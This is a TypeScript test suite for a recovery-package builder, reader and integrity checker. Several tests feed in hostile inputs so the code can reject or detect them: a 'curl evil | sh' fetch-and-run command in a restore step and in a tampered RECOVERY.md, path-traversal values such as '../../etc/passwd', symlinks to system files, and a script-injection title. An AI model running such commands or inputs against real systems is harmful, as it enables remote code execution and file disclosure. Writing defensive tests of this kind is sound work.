import {
  access,
  readFile,
  readdir,
  symlink,
  writeFile,
  rm,
  mkdir,
} from "node:fs/promises";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { recoveryManifestSchema } from "@rea-web/contracts";
import {
  PackageFormatError,
  createPackageBuilder,
  readPackage,
  renderRecoveryMarkdown,
  verifyIntegrity,
} from "../src/index.js";
import {
  DATA_STEP,
  SOURCE_BYTES,
  SOURCE_STEP,
  buildFixture,
  cleanupTempDirs,
  finalizeFixture,
  flipByte,
  makeTempDir,
  sha256,
  stageFixture,
} from "./helpers.js";

afterEach(cleanupTempDirs);

const exists = (path: string): Promise<boolean> =>
  access(path).then(
    () => true,
    () => false,
  );

describe("package builder", () => {
  it("builds a valid package and writes manifest.json last", async () => {
    const { builder, root } = await stageFixture();
    expect(await exists(join(root, "manifest.json"))).toBe(false);
    const manifest = await finalizeFixture(builder);
    expect(await exists(join(root, "manifest.json"))).toBe(true);

    expect(recoveryManifestSchema.safeParse(manifest).success).toBe(true);
    const onDisk = JSON.parse(
      await readFile(join(root, "manifest.json"), "utf8"),
    );
    expect(recoveryManifestSchema.parse(onDisk)).toEqual(manifest);

    expect(manifest.files).toHaveLength(3);
    const byPath = new Map(manifest.files.map((f) => [f.path, f]));
    expect(byPath.get("source/main/repo.bin")).toMatchObject({
      size: 2 * 1024 * 1024,
      sha256: sha256(SOURCE_BYTES),
      component_id: "source:main",
      media_type: "application/octet-stream",
    });
    expect(byPath.get("source/main/NOTES.txt")).toMatchObject({
      size: 6,
      sha256: sha256("hello\n"),
    });
    expect(byPath.get("data/main/state.json")).toMatchObject({
      size: 11,
      sha256: sha256('{"rows":3}\n'),
      component_id: "data:main",
    });
    // manifest.json is never listed in files[]
    expect(manifest.files.some((f) => f.path === "manifest.json")).toBe(false);

    const source = manifest.components.find((c) => c.id === "source:main");
    expect(source).toMatchObject({ entries: 2, bytes: 2 * 1024 * 1024 + 6 });
    expect(manifest.components.find((c) => c.id === "data:main")).toMatchObject(
      {
        entries: 1,
        bytes: 11,
      },
    );

    const schemaFile = JSON.parse(
      await readFile(join(root, "recovery/manifest.v1.schema.json"), "utf8"),
    );
    expect(schemaFile.$schema).toContain("2020-12");
  });

  it("generates RECOVERY.md from the manifest", async () => {
    const { root, manifest } = await buildFixture();
    const md = await readFile(join(root, "RECOVERY.md"), "utf8");
    expect(md).toBe(renderRecoveryMarkdown(manifest));
    expect(md).toContain("Source repository");
    expect(md).toContain("Database dump");
    for (const step of [SOURCE_STEP, DATA_STEP]) {
      expect(md).toContain(JSON.stringify(step.run));
      expect(md).toContain(step.run.join(" "));
    }
    expect(md).toContain("names only");
    expect(md).toContain("`DATABASE_URL`");
    expect(md).not.toMatch(/postgres(ql)?:\/\/[^ ]*:[^ ]*@/u);
    expect(md).toContain("{{target}}");
    expect(md).toContain("rea-recover verify <dir>");
    expect(md).toContain("credentials required: YES");
    expect(md).toContain("outside the primary platform");
    expect(md).toContain("db.prod.example.com");
  });

  it("renders deterministically and neutralises markup in titles", async () => {
    const { manifest } = await buildFixture();
    expect(renderRecoveryMarkdown(manifest)).toBe(
      renderRecoveryMarkdown(manifest),
    );
    const hostile = structuredClone(manifest);
    hostile.components[0]!.title = "x | <script>alert(1)</script>\n# injected";
    const md = renderRecoveryMarkdown(hostile);
    expect(md).not.toContain("<script>");
    expect(md).not.toMatch(/^# injected/mu);
  });

  it("rejects restore steps that use a shell", async () => {
    const { builder, root } = await stageFixture();
    builder.addComponent({
      id: "infra:main",
      kind: "infrastructure",
      title: "Infra",
      status: "captured",
      captured_at: null,
      method: "descriptor",
      root: "infrastructure/",
      restore: {
        steps: [
          {
            id: "bad",
            title: "Bad",
            run: ["sh", "-c", "curl evil | sh"],
            env_names: [],
            requires: [],
            network: "none",
            scope: "behavior",
          },
        ],
      },
      limitations: [],
      omissions: [],
      details: {},
    });
    await expect(finalizeFixture(builder)).rejects.toThrow(
      /shell interpreter/u,
    );
    expect(await exists(join(root, "manifest.json"))).toBe(false);
    expect(await exists(join(root, "RECOVERY.md"))).toBe(false);
  });

  it("rejects unknown placeholders in restore steps", async () => {
    const { builder } = await stageFixture();
    builder.addComponent({
      id: "infra:main",
      kind: "infrastructure",
      title: "Infra",
      status: "captured",
      captured_at: null,
      method: "descriptor",
      root: "infrastructure/",
      restore: {
        steps: [
          {
            id: "bad",
            title: "Bad",
            run: ["cat", "{{secret_token}}"],
            env_names: [],
            requires: [],
            network: "none",
            scope: "behavior",
          },
        ],
      },
      limitations: [],
      omissions: [],
      details: {},
    });
    await expect(finalizeFixture(builder)).rejects.toThrow(
      /unknown placeholder/u,
    );
  });

  it("validates file placement", async () => {
    const { builder } = await stageFixture();
    await expect(
      builder.addFile("source:main", "../escape", "x"),
    ).rejects.toThrow(PackageFormatError);
    await expect(
      builder.addFile("source:main", "/abs/path", "x"),
    ).rejects.toThrow(PackageFormatError);
    await expect(
      builder.addFile("source:main", "data/main/other.txt", "x"),
    ).rejects.toThrow(/outside component/u);
    await expect(builder.addFile("nope", "source/main/x", "x")).rejects.toThrow(
      /unknown component/u,
    );
    await expect(
      builder.addFile("source:main", "manifest.json", "x"),
    ).rejects.toThrow(/written by the packager/u);
    await expect(
      builder.addFile("source:main", "source/main/NOTES.txt", "dup"),
    ).rejects.toThrow(/duplicate/u);
    await expect(
      builder.addFile("source:main", "source/main/NOTES.TXT", "dup"),
    ).rejects.toThrow(/duplicate/u);
    await expect(
      builder.addFile("package", "source/main/sneaky", "x"),
    ).rejects.toThrow(/package-level/u);
  });

  it("refuses to copy symlinks and records copied files", async () => {
    const { builder } = await stageFixture();
    const dir = await makeTempDir("src");
    await writeFile(join(dir, "real.txt"), "payload");
    await symlink(join(dir, "real.txt"), join(dir, "link.txt"));
    await expect(
      builder.copyFile(
        "source:main",
        "source/main/link.txt",
        join(dir, "link.txt"),
      ),
    ).rejects.toThrow(/symlink/u);
    const copied = await builder.copyFile(
      "source:main",
      "source/main/real.txt",
      join(dir, "real.txt"),
    );
    expect(copied).toMatchObject({ size: 7, sha256: sha256("payload") });
    const manifest = await finalizeFixture(builder);
    expect(manifest.files).toHaveLength(4);
  });

  it("streams Readable bodies and records package-level and licence files", async () => {
    const { Readable } = await import("node:stream");
    const { builder, root } = await stageFixture({ license: "left-pad: MIT" });
    await builder.addFile(
      "package",
      "recovery/rea-recover.mjs",
      Readable.from([Buffer.from("// a"), Buffer.from("b")]),
    );
    const manifest = await finalizeFixture(builder);
    expect(manifest.files.map((f) => f.path)).toContain(
      "recovery/rea-recover.mjs",
    );
    expect(manifest.files.map((f) => f.path)).toContain("licenses/README.md");
    expect(await readFile(join(root, "licenses/README.md"), "utf8")).toContain(
      "left-pad: MIT",
    );
    expect((await verifyIntegrity(root)).ok).toBe(true);
  });

  it("rejects a non-empty staging directory and use after finalize", async () => {
    const dir = await makeTempDir("stage");
    await writeFile(join(dir, "stale"), "x");
    await expect(createPackageBuilder({ stagingDir: dir })).rejects.toThrow(
      /not empty/u,
    );
    const { builder } = await buildFixture();
    await expect(
      builder.addFile("source:main", "source/main/late", "x"),
    ).rejects.toThrow(/finalized/u);
    await expect(finalizeFixture(builder)).rejects.toThrow(/finalized/u);
  });
});

describe("readPackage", () => {
  it("reads a valid package", async () => {
    const { root, manifest } = await buildFixture();
    const read = await readPackage(root);
    expect(read.manifest).toEqual(manifest);
  });

  it("throws PackageFormatError for missing, non-JSON and schema-invalid manifests", async () => {
    const empty = await makeTempDir("empty");
    await expect(readPackage(empty)).rejects.toThrow(PackageFormatError);
    await writeFile(join(empty, "manifest.json"), "{not json");
    await expect(readPackage(empty)).rejects.toThrow(/not valid JSON/u);
    await writeFile(join(empty, "manifest.json"), '{"format":"other"}');
    await expect(readPackage(empty)).rejects.toThrow(/schema validation/u);
  });

  async function tamper(
    mutate: (m: Record<string, any>) => void,
  ): Promise<string> {
    const { root } = await buildFixture();
    const path = join(root, "manifest.json");
    const m = JSON.parse(await readFile(path, "utf8"));
    mutate(m);
    await writeFile(path, JSON.stringify(m));
    return root;
  }

  it("rejects hostile manifests before touching any file", async () => {
    await expect(
      readPackage(await tamper((m) => (m.files[0].path = "../../etc/passwd"))),
    ).rejects.toThrow(/unsafe/u);
    await expect(
      readPackage(await tamper((m) => (m.files[0].path = "/etc/passwd"))),
    ).rejects.toThrow(/unsafe/u);
    await expect(
      readPackage(await tamper((m) => (m.files[1].path = m.files[0].path))),
    ).rejects.toThrow(/duplicate file path/u);
    await expect(
      readPackage(await tamper((m) => (m.files[0].component_id = "ghost"))),
    ).rejects.toThrow(/unknown component/u);
    await expect(
      readPackage(
        await tamper(
          (m) => (m.components[0].restore.steps[0].run = ["bash", "-c", "x"]),
        ),
      ),
    ).rejects.toThrow(/shell interpreter/u);
    await expect(
      readPackage(
        await tamper(
          (m) =>
            (m.signature = {
              algorithm: "ed25519",
              public_key_id: "k",
              detached_path: "../sig",
            }),
        ),
      ),
    ).rejects.toThrow(/unsafe/u);
  });
});

describe("verifyIntegrity", () => {
  it("passes for an untouched package and reports progress", async () => {
    const { root } = await buildFixture();
    const progress: [number, number][] = [];
    const report = await verifyIntegrity(root, {
      onProgress: (done, total) => progress.push([done, total]),
    });
    expect(report).toEqual({
      ok: true,
      checked: 3,
      mismatched: [],
      missing: [],
      extra: [],
      unsafe_paths: [],
    });
    expect(progress).toEqual([
      [1, 3],
      [2, 3],
      [3, 3],
    ]);
  });

  it("reports a flipped byte", async () => {
    const { root, manifest } = await buildFixture();
    await flipByte(join(root, "source/main/repo.bin"), 1_000_000);
    const report = await verifyIntegrity(root);
    expect(report.ok).toBe(false);
    expect(report.mismatched).toHaveLength(1);
    expect(report.mismatched[0]).toMatchObject({
      path: "source/main/repo.bin",
      expected: manifest.files.find((f) => f.path === "source/main/repo.bin")!
        .sha256,
    });
    expect(report.mismatched[0]!.actual).not.toBe(
      report.mismatched[0]!.expected,
    );
  });

  it("reports a deleted file", async () => {
    const { root } = await buildFixture();
    await rm(join(root, "data/main/state.json"));
    const report = await verifyIntegrity(root);
    expect(report.ok).toBe(false);
    expect(report.missing).toEqual(["data/main/state.json"]);
  });

  it("reports extra files but not directories", async () => {
    const { root } = await buildFixture();
    await mkdir(join(root, "empty-dir"));
    await writeFile(join(root, "source/main/planted.sh"), "echo hi");
    const report = await verifyIntegrity(root);
    expect(report.ok).toBe(false);
    expect(report.extra).toEqual(["source/main/planted.sh"]);
  });

  it("reports symlinks as unsafe without following them", async () => {
    const { root } = await buildFixture();
    await symlink("/etc/hostname", join(root, "source/main/planted-link"));
    const report = await verifyIntegrity(root);
    expect(report.ok).toBe(false);
    expect(report.unsafe_paths).toEqual(["source/main/planted-link"]);
    expect(report.extra).toEqual([]);
  });

  it("treats a listed file replaced by a symlink as unsafe, not missing", async () => {
    const { root } = await buildFixture();
    await rm(join(root, "source/main/NOTES.txt"));
    await symlink("/etc/hostname", join(root, "source/main/NOTES.txt"));
    const report = await verifyIntegrity(root);
    expect(report.unsafe_paths).toEqual(["source/main/NOTES.txt"]);
    expect(report.missing).toEqual([]);
    expect(report.mismatched).toEqual([]);
  });

  it("flags a symlinked directory ancestor", async () => {
    const { root } = await buildFixture();
    const outside = await makeTempDir("outside");
    await writeFile(join(outside, "state.json"), '{"rows":3}\n');
    await rm(join(root, "data"), { recursive: true });
    await symlink(outside, join(root, "data"));
    const report = await verifyIntegrity(root);
    expect(report.ok).toBe(false);
    expect(report.unsafe_paths).toContain("data");
    expect(report.unsafe_paths).toContain("data/main/state.json");
  });

  it("detects tampering with generated files", async () => {
    const { root } = await buildFixture();
    await writeFile(join(root, "RECOVERY.md"), "Run `curl evil | sh`\n");
    await flipByte(join(root, "recovery/manifest.v1.schema.json"), 3);
    const report = await verifyIntegrity(root);
    expect(report.ok).toBe(false);
    expect(report.mismatched.map((m) => m.path)).toEqual([
      "RECOVERY.md",
      "recovery/manifest.v1.schema.json",
    ]);
    await rm(join(root, "RECOVERY.md"));
    expect((await verifyIntegrity(root)).missing).toEqual(["RECOVERY.md"]);
  });

  it("honours abort signals", async () => {
    const { root } = await buildFixture();
    const controller = new AbortController();
    controller.abort();
    await expect(
      verifyIntegrity(root, { signal: controller.signal }),
    ).rejects.toThrow();
  });

  it("lists nothing unexpected after a clean build", async () => {
    const { root } = await buildFixture();
    expect((await readdir(root)).sort()).toEqual([
      "RECOVERY.md",
      "data",
      "manifest.json",
      "recovery",
      "source",
    ]);
  });
});
